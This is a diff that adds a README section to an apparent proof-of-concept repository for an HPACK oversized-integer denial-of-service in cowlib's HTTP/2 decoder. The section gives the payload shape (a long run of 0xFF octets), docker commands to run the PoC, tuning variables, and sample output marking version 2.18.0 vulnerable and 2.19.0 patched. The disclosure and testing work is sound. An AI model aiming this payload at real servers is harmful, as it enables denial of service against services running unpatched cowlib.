@@ -151,6 +151,65 @@ SERVER_HOST=localhost python3 client/poc_http2.py
 > `PAYLOAD_CONTINUATIONS` ≤ ~1,000,000 or raise the cap in
 > `server/poc_server.exs` (and rebuild) to match.
 
+## Library-level PoC (`server/poc.exs`)
+
+`poc.exs` exercises `:cow_hpack.decode/2` directly — no TCP, no port binding —
+so it can run next to the live server or on its own. It feeds
+`0xFF + 0xFF×N + 0x00` to a decoder process with a `max_heap_size` cap and
+logs progress while the integer is being shifted.
+
+```bash
+# rebuild once so the file is baked into the image
+docker compose build cowboy-server
+
+# run it (safe while cowboy-server is up — it binds nothing)
+docker compose run --rm cowboy-server mix run poc.exs
+# or inside the running container:
+docker compose exec cowboy-server mix run poc.exs
+```
+
+| Variable                | Default   | Effect                                                    |
+|-------------------------|-----------|-----------------------------------------------------------|
+| `PAYLOAD_CONTINUATIONS` | `100000`  | number of `0xFF` octets                                   |
+| `HEAP_WORDS`            | `1000000` | child heap cap in words (8 B each)                        |
+| `SAMPLE_MS`             | `50`      | heap/memory sampling interval                             |
+| `LOG_EVERY`             | `5`       | log every Nth sample (`1` = all)                          |
+| `TIMEOUT_MS`            | `30000`   | hard cap on the decode                                    |
+| `VERBOSE`               | `1`       | `0` summary, `1` sampled, `2` every sample                 |
+
+Abridged output (cowlib 2.18.0):
+
+```
+[poc] cowlib 2.18.0 — HPACK oversized-integer decoder test
+[poc] config: continuations=100000 heap_words=1000000 (7.6MiB cap) sample=50ms
+[poc] payload: 100001 bytes (100000 0xFF octets + 0x00)
+[poc] baseline: vm_total=53.3MiB cgroup=97.7MiB
+[poc] decoder pid=#PID<0.216.0> started
+[poc] t+9ms   heap=200540w mem=1.5MiB reductions=1540382
+[poc] t+775ms heap=211688w mem=1.6MiB reductions=22901707
+[poc] t+2305ms heap=229920w mem=1.8MiB reductions=66772672
+[poc] decoder down after 2586ms: error :function_clause at :lists.nth/2
+[poc] VERDICT: VULNERABLE — decoder walked the full O(n²) shift chain, then failed at :lists.nth/2 on the huge index
+```
+
+Two regimes, both vulnerable:
+
+```bash
+# full O(n²) shift chain (2-3 s, sampled progress, fails on the huge index)
+docker compose run --rm cowboy-server mix run poc.exs
+
+# immediate heap-limit kill (a few ms, no ramp)
+docker compose run --rm -e HEAP_WORDS=50000 cowboy-server mix run poc.exs
+#   [poc] decoder down after 5ms: killed (max_heap_size exceeded)
+#   [poc] VERDICT: VULNERABLE — ...
+```
+
+`max_heap_size` is evaluated when a GC starts, so a small cap kills the child
+before any sample is taken; the large default cap lets the decode run long
+enough to log a ramp. With cowlib 2.19.0 the same command reports
+`VERDICT: PATCHED` (the `M < 32` guard rejects the integer after a few
+octets, decode time drops to milliseconds).
+
 ## Report notes
 
 - **Attack path:** valid HTTP/2 client preface → SETTINGS → HEADERS
